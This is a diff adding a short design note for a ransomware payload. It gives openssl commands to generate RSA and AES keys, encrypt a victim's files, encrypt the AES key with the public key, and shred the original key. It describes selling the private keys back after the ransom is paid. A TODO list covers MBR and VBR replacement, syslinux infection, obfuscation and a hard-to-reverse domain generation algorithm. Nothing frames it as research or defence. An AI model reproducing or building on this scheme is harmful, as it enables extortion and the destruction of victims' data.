@@ -1,0 +1,46 @@
+The ransomware payload
+
+## Crypto
+
+On compilation side, generate rsa keypair and a symmetric aes key
+On target, send aes key and encrypted version based on rsa pub key
+On evil corp side, store and sell private keys
+Private keys allows enc aes key decryption and files retrieval
+
+Exemple:
+
+Generate rsa keypair and aes key
+
+```console
+$ openssl genrsa -out key.pem 1024
+$ openssl rsa -in key.pem -pubout -out pub.pem
+$ openssl rand -base64 32 > aes.key
+```
+
+At this point, we can encrypt the files using the symmetric key. We must then
+make a encrypted version using the target public key and delete the original.
+
+To encrypt the files and protect the symmetric key:
+
+```console
+$ openssl enc -aes-256-cbc -salt -pbkdf2 -in file -out file.enc -pass file:aes.key
+$ openssl rsautl -encrypt -inkey pub.pem -pubin -in aes.key -out aes.key.enc
+$ shred aes.key
+```
+
+When the ransom is paid, we can recompute the symmetric key and decrypt files:
+
+```console
+$ openssl rsautl -decrypt -inkey key.pem -in aes.key.enc -out aes.key
+$ openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file -pass file:aes.key
+```
+
+## TODO
+
+* [+] replace mbr
+  * [x] replace vbr
+  * [x] syslinux infection
+* [ ] various obfuscations
+* [+] hard to reverse dga -> debug/tamper localtime()
+  * [+] shifts / masks with regular sizes/offsets -> trigger compilation optimizations
+* [ ] remove debug statments
